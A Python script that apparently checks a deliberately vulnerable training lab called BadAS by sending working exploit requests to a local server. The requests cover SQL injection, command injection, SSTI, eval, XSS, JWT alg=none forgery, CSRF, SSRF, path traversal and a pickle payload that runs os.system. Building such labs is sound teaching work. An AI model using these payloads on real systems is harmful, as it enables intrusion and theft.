#!/usr/bin/env python3
"""
Exploit-based verification for BadAS.

This script starts the server on a free localhost port with a throwaway
database and log file, then attempts each documented flaw. It is intended to
prove that the lab behaves as advertised after changes, and to serve as a
worked example of the exploit requests.

Run with the project virtualenv:

    .venv/bin/python tools/verify_flaws.py

The output spoils the review exercise. Read docs/REVIEW_GUIDE.md first if you
want to find the flaws yourself.
"""

import base64
import hashlib
import hmac
import json
import os
import pickle
import shlex
import shutil
import socket
import subprocess
import sys
import tempfile
import time

import requests

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
JWT_SECRET = "badas-jwt-secret"

RESULTS = []


def check(finding, condition, evidence):
    RESULTS.append((finding, bool(condition), evidence))


def url(path):
    return f"http://127.0.0.1:{PORT}{path}"


def md5(value):
    return hashlib.md5(value.encode()).hexdigest()


def b64url_json(value):
    raw = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def signed_token(header, payload):
    head = b64url_json(header)
    body = b64url_json(payload)
    signature = hmac.new(
        JWT_SECRET.encode(), f"{head}.{body}".encode(), hashlib.sha256
    ).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
    return f"{head}.{body}.{signature_b64}"


def free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


class TouchFile:
    """Benign pickle payload: creates a marker file instead of a reverse shell."""

    def __init__(self, path):
        self.path = path

    def __reduce__(self):
        return (os.system, (f"touch {shlex.quote(self.path)}",))


def wait_for_server(process, output_path):
    deadline = time.time() + 20
    while time.time() < deadline:
        if process.poll() is not None:
            break
        try:
            requests.get(url("/"), timeout=0.5)
            return True
        except requests.RequestException:
            time.sleep(0.15)
    try:
        with open(output_path, "r", errors="replace") as handle:
            print("server output:\n" + handle.read())
    except OSError:
        pass
    return False


def run_checks(workdir):
    marker = os.path.join(workdir, "pickle-executed")

    # --- Authentication and credentials -----------------------------------
    response = requests.post(
        url("/api/login"), json={"username": "root", "password": "password"}
    )
    root_token = response.json().get("token") if response.ok else None
    check(
        "A07 default credentials root:password work",
        response.status_code == 200 and root_token,
        f"status={response.status_code}",
    )

    response = requests.post(
        url("/api/login"),
        json={"username": "root' --", "password": "not-the-password"},
    )
    check(
        "A03 SQL injection bypasses login",
        response.status_code == 200 and response.json().get("token"),
        f"status={response.status_code} body={response.text[:120]}",
    )

    unknown = requests.post(
        url("/api/login"), json={"username": "nosuchuser", "password": "x"}
    )
    wrong = requests.post(
        url("/api/login"), json={"username": "bob", "password": "x"}
    )
    check(
        "A04 username enumeration via distinct errors",
        unknown.status_code == wrong.status_code == 401
        and unknown.json().get("error") != wrong.json().get("error"),
        f"unknown={unknown.json().get('error')!r} wrong={wrong.json().get('error')!r}",
    )

    # --- Broken access control / data exposure ---------------------------
    response = requests.get(url("/api/users/1"))
    body = response.json() if response.status_code == 200 else {}
    check(
        "A01 IDOR exposes another user's hash and secrets",
        response.status_code == 200
        and body.get("password_md5") == md5("password")
        and body.get("api_key", "").startswith("APIKEY-"),
        f"status={response.status_code} hash={body.get('password_md5')}",
    )
    check(
        "A02 unsalted MD5 password storage",
        body.get("password_md5") == md5("password"),
        f"stored={body.get('password_md5')} md5(password)={md5('password')}",
    )

    response = requests.get(url("/admin/users"))
    denied = response.status_code
    response = requests.get(url("/admin/users"), headers={"X-Admin": "true"})
    check(
        "A01 admin check trusts X-Admin header",
        denied == 403 and response.status_code == 200
        and any(user["username"] == "root" for user in response.json()),
        f"without_header={denied} with_header={response.status_code}",
    )

    response = requests.get(url("/admin/export"))
    check(
        "A01 unauthenticated admin export dumps credentials",
        response.status_code == 200
        and "APIKEY-ROOT-0001" in response.text
        and md5("password") in response.text,
        f"status={response.status_code} bytes={len(response.content)}",
    )

    # --- Registration, weak passwords, rate limiting ----------------------
    response = requests.post(
        url("/register"),
        json={"username": "ratelimituser", "password": "1", "email": "rl@badas.local"},
    )
    rate_user = response.json().get("user", {}) if response.status_code == 201 else {}
    check(
        "A07 weak password policy accepts '1'",
        response.status_code == 201,
        f"status={response.status_code}",
    )

    attempts = [
        requests.post(
            url("/api/login"),
            json={"username": "ratelimituser", "password": f"wrong-{index}"},
        ).status_code
        for index in range(20)
    ]
    response = requests.post(
        url("/api/login"), json={"username": "ratelimituser", "password": "1"}
    )
    check(
        "A07 no rate limiting or lockout on login",
        429 not in attempts and response.status_code == 200,
        f"20 attempts={set(attempts)} correct_after={response.status_code}",
    )

    response = requests.delete(url(f"/api/users/{rate_user.get('id')}"))
    gone = requests.get(url(f"/api/users/{rate_user.get('id')}"))
    check(
        "A01 unauthenticated account deletion",
        response.status_code == 200 and gone.status_code == 404,
        f"delete={response.status_code} get_after={gone.status_code}",
    )

    response = requests.put(url("/api/users/3"), json={"role": "admin"})
    body = response.json() if response.status_code == 200 else {}
    check(
        "A01 mass assignment promotes a user without auth",
        response.status_code == 200 and body.get("role") == "admin",
        f"status={response.status_code} role={body.get('role')}",
    )

    # --- CSRF and session handling ---------------------------------------
    login = requests.post(
        url("/api/login"), json={"username": "dave", "password": "dave"}
    )
    dave_sid = login.cookies.get("session_id")
    response = requests.post(
        url("/account/password"),
        data={"password": "csrf-new"},
        headers={"Origin": "https://evil.example"},
        cookies={"session_id": dave_sid},
    )
    relogin = requests.post(
        url("/api/login"), json={"username": "dave", "password": "csrf-new"}
    )
    check(
        "A01 CSRF changes a password (no token, no re-auth)",
        response.status_code == 200 and relogin.status_code == 200,
        f"change={response.status_code} relogin={relogin.status_code}",
    )

    response = requests.post(
        url("/login"),
        data={"username": "root", "password": "password"},
        cookies={"session_id": "fixated-by-attacker"},
        allow_redirects=False,
    )
    session = requests.get(
        url("/api/session"), cookies={"session_id": "fixated-by-attacker"}
    )
    check(
        "A07 session fixation: supplied session id is retained",
        response.status_code == 302
        and session.status_code == 200
        and session.json().get("username") == "root",
        f"login={response.status_code} session={session.text[:100]}",
    )

    login = requests.post(
        url("/api/login"), json={"username": "root", "password": "password"}
    )
    old_sid = login.cookies.get("session_id")
    requests.get(url("/logout"), cookies={"session_id": old_sid})
    after_logout = requests.get(
        url("/api/session"), cookies={"session_id": old_sid}
    )
    check(
        "A07 logout does not invalidate the server-side session",
        after_logout.status_code == 200,
        f"session_after_logout={after_logout.status_code}",
    )

    response = requests.post(
        url("/api/login"), json={"username": "root", "password": "password"}
    )
    set_cookies = response.raw.headers.getlist("Set-Cookie")
    session_cookie = next(
        (value for value in set_cookies if value.startswith("session_id=")), ""
    )
    session_id = session_cookie.split(";", 1)[0].split("=", 1)[-1]
    check(
        "A05 session cookie lacks HttpOnly, Secure and SameSite",
        session_cookie
        and "HttpOnly" not in session_cookie
        and "Secure" not in session_cookie
        and "SameSite" not in session_cookie,
        session_cookie,
    )
    check(
        "A02 session ids are six digits from the random module",
        session_id.isdigit() and len(session_id) == 6,
        f"session_id={session_id}",
    )

    # --- Password reset ---------------------------------------------------
    response = requests.post(
        url("/reset/request"), json={"username": "alice"}
    )
    token = response.json().get("token") if response.status_code == 200 else ""
    check(
        "A02 password reset token is predictable and returned in the response",
        token == md5("alice"),
        f"token={token} md5(alice)={md5('alice')}",
    )

    first = requests.post(
        url("/reset/confirm"),
        json={"username": "alice", "token": token, "password": "reset-one"},
    )
    second = requests.post(
        url("/reset/confirm"),
        json={"username": "alice", "token": token, "password": "reset-two"},
    )
    relogin = requests.post(
        url("/api/login"), json={"username": "alice", "password": "reset-two"}
    )
    check(
        "A02 reset token never expires and can be reused",
        first.status_code == second.status_code == 200 and relogin.status_code == 200,
        f"first={first.status_code} second={second.status_code} login={relogin.status_code}",
    )

    # --- Open redirect / traversal ---------------------------------------
    response = requests.post(
        url("/login?next=https://evil.example/"),
        data={"username": "root", "password": "password"},
        allow_redirects=False,
    )
    check(
        "A01 open redirect after login",
        response.status_code == 302
        and response.headers.get("Location") == "https://evil.example/",
        f"status={response.status_code} location={response.headers.get('Location')}",
    )

    response = requests.get(url("/files"), params={"name": "../README.md"})
    check(
        "A01 path traversal reads files outside uploads/",
        response.status_code == 200 and "BadAS" in response.text,
        f"status={response.status_code} bytes={len(response.content)}",
    )

    # --- SSRF / command injection / SSTI / eval ---------------------------
    response = requests.get(url("/fetch"), params={"url": url("/debug")})
    check(
        "A10 SSRF reaches the internal debug endpoint",
        response.status_code == 200 and "JWT_SECRET" in response.text,
        f"status={response.status_code} bytes={len(response.content)}",
    )

    response = requests.get(url("/fetch"), params={"url": "file:///etc/hosts"})
    check(
        "A10 SSRF accepts the file:// scheme",
        response.status_code == 200 and "localhost" in response.text,
        f"status={response.status_code} body={response.text[:80]!r}",
    )

    response = requests.get(
        url("/ping"), params={"host": "127.0.0.1;echo BADAS_PWNED"}
    )
    check(
        "A03 command injection in ping",
        "BADAS_PWNED" in response.text,
        f"status={response.status_code} body={response.text[:120]!r}",
    )

    response = requests.get(url("/greet"), params={"name": "{{7*7}}"})
    check(
        "A03 server-side template injection",
        response.status_code == 200 and "49" in response.text,
        f"body={response.text[:80]!r}",
    )

    response = requests.post(
        url("/api/calc"), json={"expr": "__import__('os').getcwd()"}
    )
    result = response.json().get("result") if response.ok else None
    check(
        "A03 eval executes arbitrary Python",
        response.status_code == 200 and result == BASE_DIR,
        f"result={result!r}",
    )

    response = requests.get(
        url("/"), params={"msg": "<script>alert(1)</script>"}
    )
    check(
        "A03 reflected XSS on the home page",
        response.status_code == 200 and "<script>alert(1)</script>" in response.text,
        f"status={response.status_code}",
    )

    # --- SQL injection in search + verbose errors -------------------------
    response = requests.get(
        url("/api/users/search"), params={"q": "' OR 1=1 --"}
    )
    usernames = [user["username"] for user in response.json()] if response.ok else []
    check(
        "A03 SQL injection in user search returns all rows",
        response.status_code == 200 and "root" in usernames and "alice" in usernames,
        f"users={usernames}",
    )

    response = requests.get(url("/api/users/search"), params={"q": "'"})
    check(
        "A05 verbose SQL errors are returned to the client",
        response.status_code == 500 and "error" in response.text.lower(),
        f"status={response.status_code} body={response.text[:140]!r}",
    )

    # --- JWT --------------------------------------------------------------
    header = b64url_json({"alg": "none", "typ": "JWT"})
    payload = b64url_json({"sub": "root", "role": "admin", "exp": 1})
    response = requests.get(
        url("/api/me"), headers={"Authorization": f"Bearer {header}.{payload}."}
    )
    check(
        "A07 JWT accepts alg=none and trusts the role claim",
        response.status_code == 200
        and response.json().get("role") == "admin",
        f"status={response.status_code} body={response.text[:100]}",
    )

    expired = signed_token(
        {"alg": "HS256", "typ": "JWT"},
        {"sub": "root", "role": "admin", "exp": 1},
    )
    response = requests.get(
        url("/api/me"), headers={"Authorization": f"Bearer {expired}"}
    )
    check(
        "A02/A07 JWT secret is hardcoded and exp is ignored",
        response.status_code == 200 and response.json().get("role") == "admin",
        f"status={response.status_code} body={response.text[:100]}",
    )

    # --- Debug, CORS, headers --------------------------------------------
    response = requests.get(url("/debug"))
    check(
        "A05 unauthenticated /debug dumps secrets and sessions",
        response.status_code == 200
        and "JWT_SECRET" in response.text
        and "sessions" in response.text,
        f"status={response.status_code} bytes={len(response.content)}",
    )

    response = requests.post(url("/api/calc"), json={"expr": "1/0"})
    check(
        "A05 debug mode returns a Python traceback",
        response.status_code == 500 and "ZeroDivisionError" in response.text,
        f"status={response.status_code}",
    )

    response = requests.get(url("/"), headers={"Origin": "https://evil.example"})
    check(
        "A05 CORS reflects any origin with credentials",
        response.headers.get("Access-Control-Allow-Origin") == "https://evil.example"
        and response.headers.get("Access-Control-Allow-Credentials") == "true",
        f"acao={response.headers.get('Access-Control-Allow-Origin')} "
        f"acac={response.headers.get('Access-Control-Allow-Credentials')}",
    )

    missing = [
        header
        for header in (
            "X-Frame-Options",
            "Content-Security-Policy",
            "Strict-Transport-Security",
            "X-Content-Type-Options",
        )
        if header not in response.headers
    ]
    check(
        "A05 security headers are absent",
        len(missing) == 4,
        f"missing={missing}",
    )

    # --- Logging ----------------------------------------------------------
    requests.post(
        url("/api/login"), json={"username": "root", "password": "password"}
    )
    response = requests.get(url("/admin/audit"))
    check(
        "A09 audit log is unauthenticated and contains plaintext passwords",
        response.status_code == 200 and "password=password" in response.text,
        f"status={response.status_code} bytes={len(response.content)}",
    )

    requests.post(
        url("/api/login"),
        json={"username": "evil\nFAKE-AUDIT-ENTRY", "password": "x"},
    )
    response = requests.get(url("/admin/audit"))
    check(
        "A09 log injection forges an audit line",
        "FAKE-AUDIT-ENTRY" in response.text,
        f"status={response.status_code}",
    )

    # --- Unsafe deserialization ------------------------------------------
    payload = base64.urlsafe_b64encode(
        pickle.dumps(TouchFile(marker))
    ).rstrip(b"=").decode()
    requests.get(url("/"), cookies={"remember": payload})
    check(
        "A08 pickle deserialization of the remember cookie executes code",
        os.path.exists(marker),
        f"marker_created={os.path.exists(marker)}",
    )


def main():
    global PORT
    workdir = tempfile.mkdtemp(prefix="badas-verify-")
    output_path = os.path.join(workdir, "server.out")
    PORT = free_port()

    env = os.environ.copy()
    env["BADAS_DB"] = os.path.join(workdir, "badas.db")
    env["BADAS_LOG"] = os.path.join(workdir, "badas.log")
    env["PYTHONUNBUFFERED"] = "1"

    output_handle = open(output_path, "wb")
    process = subprocess.Popen(
        [
            sys.executable,
            os.path.join(BASE_DIR, "auth_server.py"),
            "--port",
            str(PORT),
        ],
        cwd=BASE_DIR,
        env=env,
        stdout=output_handle,
        stderr=subprocess.STDOUT,
    )

    try:
        if not wait_for_server(process, output_path):
            print("Server did not start; aborting.")
            return 1

        run_checks(workdir)
    finally:
        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
        output_handle.close()

    failures = 0
    print()
    for finding, passed, evidence in RESULTS:
        status = "PASS" if passed else "FAIL"
        if not passed:
            failures += 1
        print(f"[{status}] {finding}")
        print(f"       {evidence}")
    print()
    print(f"{len(RESULTS) - failures}/{len(RESULTS)} checks passed")

    if failures:
        print(f"\nServer output ({output_path}):")
        with open(output_path, "r", errors="replace") as handle:
            print(handle.read()[-4000:])
        shutil.rmtree(workdir, ignore_errors=True)
        return 1

    shutil.rmtree(workdir, ignore_errors=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
